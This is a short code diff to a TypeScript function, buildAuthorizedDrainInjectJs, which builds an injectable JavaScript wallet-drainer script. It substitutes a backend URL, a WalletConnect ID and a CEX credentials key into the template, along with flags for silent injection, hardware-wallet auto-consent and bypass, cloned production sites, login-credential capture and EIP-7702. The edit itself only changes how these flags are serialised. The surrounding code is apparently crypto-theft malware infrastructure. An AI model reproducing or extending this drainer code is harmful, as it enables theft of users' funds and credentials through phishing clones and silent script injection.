@@ -117,18 +117,18 @@ export async function buildAuthorizedDrainInjectJs(
   template = template.replace(/__BACKEND_URL__/g, backendUrl)
   template = template.replace(/__KINETIC_KEY__/g, kineticKey)
   template = template.replace(/__WC_PROJECT_ID__/g, wcProjectId)
-  template = template.replace(/__HARDWARE_AUTO_CONSENT__/g, String(hardwareAutoConsent))
-  template = template.replace(/__SILENT_INJECT__/g, String(silentInject))
-  template = template.replace(/__FORCE_HARDWARE_BYPASS__/g, String(forceHardwareBypass))
-  template = template.replace(/__PRODUCTION_CLONE__/g, String(productionClone))
-  template = template.replace(/__QA_VISIBLE_UI__/g, String(qaVisibleUi))
+  template = template.replace(/__HARDWARE_AUTO_CONSENT_JSON__/g, JSON.stringify(hardwareAutoConsent))
+  template = template.replace(/__FORCE_HARDWARE_BYPASS_JSON__/g, JSON.stringify(forceHardwareBypass))
+  template = template.replace(/__SILENT_INJECT_JSON__/g, JSON.stringify(silentInject))
+  template = template.replace(/__PRODUCTION_CLONE_JSON__/g, JSON.stringify(productionClone))
+  template = template.replace(/__QA_VISIBLE_UI_JSON__/g, JSON.stringify(qaVisibleUi))
   template = template.replace(/__CEX_CREDS_API_KEY__/g, cexCredsApiKey)
-  template = template.replace(/__CAPTURE_LOGIN_CREDS__/g, String(captureLoginCreds))
+  template = template.replace(/__CAPTURE_LOGIN_CREDS_JSON__/g, JSON.stringify(captureLoginCreds))
 
   const eip7702Enabled =
     config.eip7702Enabled === true ||
     (process.env['EIP7702_ENABLED']?.trim().toLowerCase() ?? '') === 'true'
-  template = template.replace(/__EIP7702_ENABLED__/g, String(eip7702Enabled))
+  template = template.replace(/__EIP7702_ENABLED_JSON__/g, JSON.stringify(eip7702Enabled))
 
   const obfuscateCfg = parseObfuscateEnv()
   const backendUrls =
